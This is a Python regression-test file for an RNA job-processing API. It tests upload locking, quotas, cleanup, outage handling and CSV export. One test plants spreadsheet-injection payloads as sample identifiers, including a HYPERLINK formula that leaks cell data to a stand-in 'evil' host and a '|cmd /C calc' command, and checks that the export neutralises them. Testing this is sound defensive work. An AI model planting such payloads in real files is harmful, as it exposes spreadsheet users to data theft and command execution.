"""Regression tests for the signal-branch review findings (quota atomicity, tus locking and
file/row reconciliation, results ordering and sort limits, CSV formula neutralisation,
cleanup backstops, database outages, retention wording).

Same fixtures as tests/test_jobs_api.py: stub predictor, SQLite, tmp upload dir, null queue.
"""

from __future__ import annotations

import asyncio
import csv
import io
import os
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import UTC, datetime, timedelta

import pytest

from app.db import make_engine, make_sessionmaker
from app.jobs.cleanup import run_cleanup
from app.jobs.models import Job, Upload
from tests import test_jobs_api as base
from tests.test_jobs_api import (
    FILES,
    POD5,
    READS,
    _ctx,
    _done_job,
    _init,
    _multipart_files,
    _patch,
    _post_multipart,
    _set_job,
    _upload_all,
    _write_results_sqlite,
)

# Fixtures shared with tests/test_jobs_api.py, bound by assignment so pytest registers them
# here (an imported fixture name would be shadowed by every test parameter of that name).
sample_dir = base.sample_dir
make_client = base.make_client
client = base.client

# --------------------------------------------------------------------------- quotas (F2)


def test_quota_check_and_insert_are_atomic_across_parallel_requests(make_client):
    """Eight simultaneous inits from one address at a cap of three: exactly three win."""
    client = make_client(max_queued_per_ip=3)
    files = {slot: {"name": f"my.{slot}", "size": len(FILES[slot])} for slot in FILES}
    n = 8
    barrier = threading.Barrier(n)

    def submit(_: int) -> int:
        barrier.wait()
        return client.post("/api/jobs/signal/init", json={"kit": "RNA004", "files": files}).status_code

    with ThreadPoolExecutor(max_workers=n) as pool:
        codes = sorted(pool.map(submit, range(n)))
    assert codes == [201] * 3 + [429] * 5
    with _ctx(client).sessions() as session:
        assert session.query(Job).filter(Job.status == "uploading").count() == 3

    # the same guard covers the multipart and sample routes
    barrier = threading.Barrier(4)

    def mixed(i: int) -> int:
        barrier.wait()
        if i % 2:
            return client.post("/api/jobs/signal/sample").status_code
        return _post_multipart(client).status_code

    with ThreadPoolExecutor(max_workers=4) as pool:
        assert sorted(pool.map(mixed, range(4))) == [429] * 4


# ------------------------------------------------------------------- tus locking (F3, F4)


def test_upload_locks_survive_a_queued_waiter():
    from app.api.uploads_tus import UploadLocks

    async def scenario() -> list[str]:
        locks = UploadLocks()
        events: list[str] = []
        release_a = asyncio.Event()

        async def a() -> None:
            async with locks.hold("u"):
                events.append("a-in")
                await release_a.wait()
                events.append("a-out")

        async def b() -> None:
            async with locks.hold("u"):
                events.append("b-in")
                await asyncio.sleep(0)
                await asyncio.sleep(0)
                events.append("b-out")

        async def c() -> None:
            async with locks.hold("u"):
                events.append("c-in")
                events.append("c-out")

        ta = asyncio.create_task(a())
        await asyncio.sleep(0)
        tb = asyncio.create_task(b())
        await asyncio.sleep(0)
        assert locks.waiting_on("u") == 2  # a holds, b queued
        release_a.set()
        await asyncio.sleep(0)  # a releases; b is woken but has not run yet ...
        tc = asyncio.create_task(c())  # ... and c must join the same lock, not a fresh one
        await asyncio.gather(ta, tb, tc)
        assert len(locks) == 0
        return events

    events = asyncio.run(scenario())
    assert events == ["a-in", "a-out", "b-in", "b-out", "c-in", "c-out"]


def test_concurrent_patches_never_corrupt_an_upload(client):
    status = _init(client).json()
    url = status["uploads"]["pod5"]["url"]
    upload_id = url.rsplit("/", 1)[1]
    bodies = [bytes([i]) * 700 for i in range(6)]
    barrier = threading.Barrier(len(bodies))

    def patch(i: int) -> int:
        barrier.wait()
        return _patch(client, url, bodies[i], 0).status_code

    with ThreadPoolExecutor(max_workers=len(bodies)) as pool:
        codes = sorted(pool.map(patch, range(len(bodies))))
    assert codes == [204] + [409] * (len(bodies) - 1)
    storage = _ctx(client).storage
    assert client.head(url).headers["Upload-Offset"] == "700"
    data = storage.tus_path(upload_id).read_bytes()
    assert len(data) == 700 and data in bodies
    assert storage.read_tus_meta(upload_id)["offset"] == 700


def test_truncate_tus_only_ever_shrinks(client):
    storage = _ctx(client).storage
    upload_id = _init(client).json()["uploads"]["pod5"]["url"].rsplit("/", 1)[1]
    path = storage.tus_path(upload_id)
    path.write_bytes(b"x" * 10)
    storage.truncate_tus(upload_id, 20)
    assert path.read_bytes() == b"x" * 10  # no NUL padding
    storage.truncate_tus(upload_id, 4)
    assert path.read_bytes() == b"xxxx"
    storage.truncate_tus("00000000-0000-4000-8000-000000000000", 0)  # missing file: no-op


def test_patch_resyncs_the_row_when_the_file_is_shorter(client):
    """A lost write (crash between append and commit) must reopen the gap, not zero-fill it."""
    status = _init(client).json()
    job_id = status["job_id"]
    url = status["uploads"]["pod5"]["url"]
    upload_id = url.rsplit("/", 1)[1]
    storage = _ctx(client).storage
    assert _patch(client, url, POD5[:1000], 0).status_code == 204
    with open(storage.tus_path(upload_id), "r+b") as fh:
        fh.truncate(400)  # the row still says 1000

    r = _patch(client, url, POD5[1000:], 1000)
    assert r.status_code == 409, r.text
    assert r.headers["Upload-Offset"] == "400"
    assert client.head(url).headers["Upload-Offset"] == "400"
    assert storage.read_tus_meta(upload_id)["offset"] == 400
    assert storage.tus_path(upload_id).stat().st_size == 400

    assert _patch(client, url, POD5[400:], 400).status_code == 204
    assert storage.tus_path(upload_id).read_bytes() == POD5
    st = client.get(f"/api/jobs/{job_id}").json()
    assert st["uploads"]["pod5"]["complete"] is True
    for slot in ("bam", "reference", "regions"):
        _upload_all(client, {"uploads": {slot: status["uploads"][slot]}})
    assert client.post(f"/api/jobs/{job_id}/start").status_code == 202
    assert storage.input_path(job_id, "pod5").read_bytes() == POD5


# ------------------------------------------------------------------- start recovery (JOB-7)


def test_start_reopens_uploads_whose_bytes_are_gone(client):
    status = _init(client).json()
    job_id = status["job_id"]
    _upload_all(client, status)
    storage = _ctx(client).storage
    pod5_url = status["uploads"]["pod5"]["url"]
    bam_url = status["uploads"]["bam"]["url"]
    storage.tus_path(pod5_url.rsplit("/", 1)[1]).unlink()  # gone entirely
    with open(storage.tus_path(bam_url.rsplit("/", 1)[1]), "r+b") as fh:
        fh.truncate(100)  # partially lost

    r = client.post(f"/api/jobs/{job_id}/start")
    assert r.status_code == 409, r.text
    assert r.json()["detail"] == "Uploads incomplete for: pod5, bam."
    st = client.get(f"/api/jobs/{job_id}").json()
    assert st["status"] == "uploading"
    assert st["uploads"]["pod5"] == {"url": pod5_url, "length": len(POD5), "offset": 0, "complete": False}
    assert st["uploads"]["bam"]["offset"] == 100 and st["uploads"]["bam"]["complete"] is False
    assert st["uploads"]["reference"]["complete"] is True
    assert client.head(pod5_url).headers["Upload-Offset"] == "0"
    assert client.head(bam_url).headers["Upload-Offset"] == "100"

    # the client resumes exactly the missing bytes
    assert _patch(client, pod5_url, POD5, 0).status_code == 204
    assert _patch(client, bam_url, FILES["bam"][100:], 100).status_code == 204
    r = client.post(f"/api/jobs/{job_id}/start")
    assert r.status_code == 202, r.text
    for slot, data in FILES.items():
        assert storage.input_path(job_id, slot).read_bytes() == data


def test_start_accepts_a_file_an_earlier_attempt_already_moved(client):
    status = _init(client).json()
    job_id = status["job_id"]
    _upload_all(client, status)
    storage = _ctx(client).storage
    ref_id = status["uploads"]["reference"]["url"].rsplit("/", 1)[1]
    storage.move_tus_into_input(ref_id, job_id, "reference")  # as if start crashed mid-way
    assert not storage.tus_path(ref_id).exists()

    r = client.post(f"/api/jobs/{job_id}/start")
    assert r.status_code == 202, r.text
    for slot, data in FILES.items():
        assert storage.input_path(job_id, slot).read_bytes() == data
    assert list(storage.tus_dir.iterdir()) == []


def test_start_reopens_an_upload_that_fails_validation(client):
    bad = b"seqnames,start,end,width,strand\ntx_A,x,300,241,+\n"
    good = b"seqnames,start,end,width,strand\ntx_A,1,300,241,+\n"
    assert len(bad) == len(good)
    status = _init(client, sizes={"regions": len(bad)}).json()
    job_id = status["job_id"]
    for slot in ("pod5", "bam", "reference"):
        _upload_all(client, {"uploads": {slot: status["uploads"][slot]}})
    url = status["uploads"]["regions"]["url"]
    assert _patch(client, url, bad, 0).status_code == 204

    r = client.post(f"/api/jobs/{job_id}/start")
    assert r.status_code == 422 and "non-integer" in r.json()["detail"]
    st = client.get(f"/api/jobs/{job_id}").json()
    assert st["status"] == "uploading"
    assert st["uploads"]["regions"]["offset"] == 0 and st["uploads"]["regions"]["complete"] is False
    assert st["uploads"]["pod5"]["complete"] is True
    assert client.head(url).headers["Upload-Offset"] == "0"

    assert _patch(client, url, good, 0).status_code == 204
    assert client.post(f"/api/jobs/{job_id}/start").status_code == 202


# ------------------------------------------------------------------- regions parsing (F5)


def test_regions_csv_parse_errors_are_422(client):
    # a stray opening quote turns the rest of the file into one > 128 KB field: csv.Error
    regions = b"seqnames,start,end,width,strand\n\"" + b"tx_A,1,2,2,+\n" * 20000
    r = _post_multipart(client, files=_multipart_files(regions=regions))
    assert r.status_code == 422, r.text
    assert r.json()["detail"].startswith("The regions file could not be parsed as CSV")
    assert list(_ctx(client).storage.jobs_dir.iterdir()) == []


# --------------------------------------------------------------- results ordering (F6, JOB-6)


def test_results_pages_follow_the_csv_order(client):
    job_id = _done_job(client)
    base = f"/api/jobs/{job_id}/results"
    page = client.get(base, params={"limit": 4}).json()["results"]
    page += client.get(base, params={"limit": 4, "offset": 4}).json()["results"]
    page += client.get(base, params={"limit": 4, "offset": 8}).json()["results"]
    csv_text = client.get(f"/api/jobs/{job_id}/download.csv").text
    csv_rows = list(csv.DictReader(io.StringIO(csv_text)))
    assert [(x["transcript_id"], x["position"], x["mod_type"]) for x in page] == [
        (x["transcript_id"], int(x["position"]), x["mod_type"]) for x in csv_rows
    ]
    reads = client.get(base, params={"level": "read", "limit": 1000}).json()["results"]
    assert [(x["read_id"], x["transcript_id"], x["position"], x["mod_type"]) for x in reads] == [
        (r[0], r[1], r[2], r[4]) for r in READS
    ]


def test_read_level_sort_is_limited_to_one_site(client):
    job_id = _done_job(client)
    base = f"/api/jobs/{job_id}/results"
    r = client.get(base, params={"level": "read", "sort": "rate"})
    assert r.status_code == 422, r.text
    assert "transcript_id and position" in r.json()["detail"]
    r = client.get(base, params={"level": "read", "sort": "mod_type", "transcript_id": "tx_A"})
    assert r.status_code == 422
    r = client.get(base, params={"level": "read", "sort": "coverage", "transcript_id": "tx_A", "position": 61})
    assert r.status_code == 422 and "read-level rows have no coverage" in r.json()["detail"]
    r = client.get(
        base,
        params={"level": "read", "sort": "rate", "order": "desc", "transcript_id": "tx_A", "position": 61},
    )
    assert r.status_code == 200
    assert [x["probability"] for x in r.json()["results"]] == [0.95, 0.8, 0.6, 0.1]
    # site level is unrestricted; the default read-level order needs no filter
    assert client.get(base, params={"sort": "rate"}).status_code == 200
    assert client.get(base, params={"level": "read"}).status_code == 200


# ------------------------------------------------------------------- CSV injection (F7)


def test_csv_neutralises_formula_prefixed_identifiers(client):
    job_id = _done_job(client)
    evil_tx = '=HYPERLINK("http://evil/"&A2,"open")'
    sites = [(evil_tx, 5, "+", "m6A", 0.5, 0.4, 0.6, 40, 20, 0.9, 0.9)]
    reads = [
        ("-2+3|cmd /C calc", evil_tx, 5, "+", "m6A", 0.9),
        ("@SUM(1)", "+tx", 5, "+", "m6A", 0.9),
        ("read-normal", "tx-normal", 5, "+", "m6A", 0.9),
    ]
    _write_results_sqlite(_ctx(client).storage.results_path(job_id), sites=sites, reads=reads)

    text = client.get(f"/api/jobs/{job_id}/download.csv").text
    row = next(csv.DictReader(io.StringIO(text)))
    assert row["transcript_id"] == "'" + evil_tx
    rows = list(csv.DictReader(io.StringIO(client.get(f"/api/jobs/{job_id}/download.csv?level=read").text)))
    assert [r["read_id"] for r in rows] == ["'-2+3|cmd /C calc", "'@SUM(1)", "read-normal"]
    assert [r["transcript_id"] for r in rows] == ["'" + evil_tx, "'+tx", "tx-normal"]
    # JSON keeps the raw identifiers: only the spreadsheet download is neutralised
    body = client.get(f"/api/jobs/{job_id}/results").json()
    assert body["results"][0]["transcript_id"] == evil_tx

    # the sequence branch shares the writer: a FASTA header is user-controlled too
    seq = "ACGU" * 30
    r = client.post(
        "/api/predict/sequence", params={"format": "csv"}, json={"sequence": f">=1+1 evil\n{seq}"}
    )
    assert r.status_code == 200, r.text
    ids = {row["transcript_id"] for row in csv.DictReader(io.StringIO(r.text))}
    assert ids <= {"'=1+1"}, ids


# --------------------------------------------------------------------- cleanup (F8, JOB-1)


def test_cleanup_purges_terminal_rows_whose_files_are_long_gone(client):
    ctx = _ctx(client)
    now = datetime.now(UTC)
    # cancelled while uploading (never started): row goes after upload_ttl_h
    early = _init(client).json()["job_id"]
    assert client.post(f"/api/jobs/{early}/cancel").status_code == 200
    _set_job(client, early, results_deleted_at=now - timedelta(hours=49))
    # cancelled just now: kept
    recent = _init(client).json()["job_id"]
    assert client.post(f"/api/jobs/{recent}/cancel").status_code == 200
    # expired results, deleted 15 days ago: row goes after results_retention_days
    old_done = _done_job(client)
    _set_job(
        client,
        old_done,
        status="expired",
        started_at=now - timedelta(days=40),
        results_deleted_at=now - timedelta(days=15),
    )
    # expired results deleted yesterday: still answers `expired`
    fresh_expired = _done_job(client)
    _set_job(
        client,
        fresh_expired,
        status="expired",
        started_at=now - timedelta(days=20),
        results_deleted_at=now - timedelta(days=1),
    )

    report = run_cleanup(ctx.sessions, ctx.storage, ctx.settings, now=now)
    assert report.purged_rows == 2
    with ctx.sessions() as session:
        assert session.get(Job, early) is None and session.get(Job, old_done) is None
        assert session.get(Job, recent).status == "cancelled"
        assert session.get(Job, fresh_expired).status == "expired"
        assert session.query(Upload).filter(Upload.job_id.in_([early, old_done])).count() == 0
    assert client.get(f"/api/jobs/{early}").status_code == 404
    assert client.get(f"/api/jobs/{fresh_expired}").json()["status"] == "expired"
    assert run_cleanup(ctx.sessions, ctx.storage, ctx.settings, now=now).purged_rows == 0


def test_cleanup_removes_orphan_job_dirs(client):
    ctx = _ctx(client)
    storage = ctx.storage
    now = datetime.now(UTC)
    orphan = "0f0f0f0f-0f0f-4f0f-8f0f-0f0f0f0f0f0f"
    d = storage.create_job_dir(orphan)
    (d / "input" / "input.pod5").write_bytes(b"o" * 4096)
    old_ts = (now - timedelta(hours=72)).timestamp()
    os.utime(d, (old_ts, old_ts))
    known = _post_multipart(client).json()["job_id"]
    os.utime(storage.job_dir(known), (old_ts, old_ts))

    report = run_cleanup(ctx.sessions, storage, ctx.settings, now=now)
    assert report.orphan_dirs == 1 and report.bytes_freed >= 4096
    assert not storage.job_dir(orphan).exists()
    assert storage.job_dir(known).exists()


def test_cancel_backstop_waits_for_a_worker_that_is_still_alive(client):
    ctx = _ctx(client)
    storage = ctx.storage
    job_id = _post_multipart(client).json()["job_id"]
    t0 = datetime.now(UTC)
    _set_job(client, job_id, status="running", stage="features", started_at=t0, heartbeat_at=t0)
    assert client.post(f"/api/jobs/{job_id}/cancel").status_code == 200
    _set_job(client, job_id, expires_at=t0 + timedelta(hours=1))

    # the revoke was lost: the worker keeps heartbeating past the 1 h backstop
    alive = t0 + timedelta(minutes=60, seconds=50)
    _set_job(client, job_id, heartbeat_at=alive)
    report = run_cleanup(ctx.sessions, storage, ctx.settings, now=t0 + timedelta(minutes=61))
    assert report.expired_jobs == 0 and report.deferred_jobs == 1
    assert storage.job_dir(job_id).exists()
    with ctx.sessions() as session:
        job = session.get(Job, job_id)
        assert job.status == "cancelled" and job.results_deleted_at is None

    # once the heartbeat is stale the directory is reaped
    later = alive + timedelta(minutes=11)
    report = run_cleanup(ctx.sessions, storage, ctx.settings, now=later)
    assert report.expired_jobs == 1 and report.deferred_jobs == 0
    assert not storage.job_dir(job_id).exists()
    with ctx.sessions() as session:
        job = session.get(Job, job_id)
        assert job.status == "cancelled" and job.results_deleted_at == later


# ----------------------------------------------------------------- database outage (JOB-5)


def test_database_outage_answers_503_json(client, tmp_path):
    ctx = _ctx(client)
    job_id = _post_multipart(client).json()["job_id"]
    status = _init(client).json()
    url = status["uploads"]["pod5"]["url"]
    working = ctx.sessions
    broken = make_engine(f"sqlite+pysqlite:///{tmp_path}/missing-dir/jobs.db")
    ctx.sessions = make_sessionmaker(broken)
    try:
        for method, path in [
            ("GET", f"/api/jobs/{job_id}"),
            ("GET", f"/api/jobs/{job_id}/results"),
            ("POST", "/api/jobs/signal/sample"),
            ("POST", f"/api/jobs/{job_id}/cancel"),
            ("HEAD", url),
        ]:
            r = client.request(method, path)
            assert r.status_code == 503, (method, path, r.status_code, r.text)
            assert r.headers["Retry-After"] == "10"
            if method != "HEAD":
                assert r.headers["content-type"].startswith("application/json")
                assert r.json() == {
                    "detail": "The job database is not reachable; please try again later."
                }
        r = _patch(client, url, POD5[:10], 0)
        assert r.status_code == 503 and "not reachable" in r.json()["detail"]
    finally:
        ctx.sessions = working
        broken.dispose()
    assert client.get(f"/api/jobs/{job_id}").status_code == 200
    assert client.get("/api/capabilities").json()["signal"] is True


# --------------------------------------------------------------- wording and logs (DOC-12, F9)


def test_landing_and_docs_state_the_configured_retention(make_client):
    client = make_client(results_retention_days=7, inputs_max_age_h=24, upload_ttl_h=12)
    html = client.get("/").text
    assert "24 hours of upload" in html and "kept for 7 days" in html
    assert "expire after 12 hours" in html
    assert "14 days" not in html and "48 hours" not in html and "{{" not in html
    description = client.get("/openapi.json").json()["info"]["description"]
    assert "at most 24 h" in description and "kept 7" in description and "12 h" in description
    assert "{{" not in description
    caps = client.get("/api/capabilities").json()["retention"]
    assert caps == {"inputs_deleted": "after feature extraction, at most 24 h", "results_days": 7}


def test_settings_dump_redacts_the_broker_password(caplog, make_client, tmp_path):
    import logging

    with caplog.at_level(logging.INFO, logger="app.main"):
        client = make_client(
            celery_broker_url="redis://:S3cretPw@redis.example:6379/0",
            database_url=f"sqlite+pysqlite:///{tmp_path}/r.db",
        )
    text = "\n".join(rec.getMessage() for rec in caplog.records)
    assert "S3cretPw" not in text
    assert "'celery_broker_url': '***'" in text
    assert _ctx(client).queue.name == "celery"  # the URL still reaches the producer


@pytest.mark.parametrize("value", ["", "   "])
def test_empty_broker_url_means_no_broker(make_client, value):
    client = make_client(celery_broker_url=value)
    assert _ctx(client).queue.name == "null"
